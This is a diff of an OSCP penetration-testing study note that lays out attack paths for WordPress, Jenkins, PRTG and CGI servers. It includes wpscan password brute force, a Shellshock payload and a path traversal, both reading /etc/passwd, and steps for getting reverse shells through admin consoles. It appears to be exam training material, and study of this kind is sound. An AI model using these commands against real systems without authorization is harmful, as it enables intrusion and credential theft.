@@ -8,9 +8,9 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for specific enterprise we
 
 ### Found a WordPress site — where do I start?
 
-→ `wpscan --url http://<target> --enumerate`, one command for users, plugins, themes, version, upload directory listing
+→ `wpscan --url http://$BoxIP --enumerate`, one command for users, plugins, themes, version, upload directory listing
 → If upload directory listing is on: browse `/wp-content/uploads/YYYY/MM/` for files left publicly accessible
-→ If you have creds or found a user: `wpscan --password-attack xmlrpc -t 20 -U <user> -P rockyou.txt --url <target>` (xmlrpc is faster and often less protected than wp-login.php)
+→ If you have creds or found a user: `wpscan --password-attack xmlrpc -t 20 -U $Username -P rockyou.txt --url $BoxIP` (xmlrpc is faster and often less protected than wp-login.php)
 → For each discovered plugin: `curl /wp-content/plugins/<name>/readme.txt | grep "Stable tag"` → `searchsploit <plugin> <version>`
 → Suspect a plugin is vulnerable but no exact CVE? Try path traversal: `/wp-content/plugins/<name>/inc/.../file.php?param=/etc/passwd`
 → Got admin creds? Theme editor RCE → Appearance → Theme Editor → `404.php` → inject reverse shell → trigger via theme's 404.php URL
@@ -42,7 +42,7 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for specific enterprise we
 
 ### Found Jenkins
 
-→ Version: login (admin:admin default) → bottom-right of any page
+→ Version: login ($Username:$Password default) → bottom-right of any page
 → Got admin? Manage Jenkins → Script Console → Groovy reverse shell → instant root (Jenkins usually runs as root/SYSTEM)
 → See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.6]], [[Common Applications#Jenkins|Command Appendix]]
 
@@ -55,7 +55,7 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for specific enterprise we
 ### Found PRTG Network Monitor (port 8080)
 
 → Version: Nmap banner, bottom-left of web UI
-→ Default creds: `prtgadmin:Password123`
+→ Default creds: `prtgadmin:$Password`
 → Got admin? Setup → Notifications → Add → Execute Program → "Demo exe notification" → Parameter field as shell command → test (bell icon) → user created → CrackMapExec verify → Evil-WinRM
 → See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.8]], [[Common Applications#PRTG Network Monitor|Command Appendix]]
 
@@ -70,7 +70,7 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for specific enterprise we
 ### Found a CGI endpoint on a Linux Apache server
 
 → Fuzz `/cgi-bin/FUZZ` with `.cgi`, `.sh`, `.pl` extensions
-→ Test for Shellshock: `curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<target>/cgi-bin/<script>.cgi`
+→ Test for Shellshock: `curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://$BoxIP/cgi-bin/<script>.cgi`
 → If output appears: inject reverse shell via the same User-Agent header
 → Any header the server passes to the CGI as an env var can carry the payload (Referer, Cookie, X-Forwarded-For)
 → See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.11]], [[Common Applications#Shellshock (CGI)|Command Appendix]]
@@ -130,7 +130,7 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for specific enterprise we
 
 → Add known IP + hostnames to `/etc/hosts` → `sudo nmap STMIP -p 80,443,8000,8080,8180,8888,10000 --open -oA webDiscovery -iL scopeList`
 → Feed Nmap XML into EyeWitness or Aquatone for screenshots → identify app types visually
-→ vHost fuzz: `gobuster vhost -u <domain> -w subdomains-top1million-5000.txt --append-domain`
+→ vHost fuzz: `gobuster vhost -u $Domain -w subdomains-top1million-5000.txt --append-domain`
 → For each discovered vHost: check for GitLab repos (may contain creds for other services)
 → See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|application discovery and skills assessment]]
 ## External Resources
@@ -140,3 +140,14 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for specific enterprise we
 - [RevShells](https://www.revshells.com/) for shell troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for transformations
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
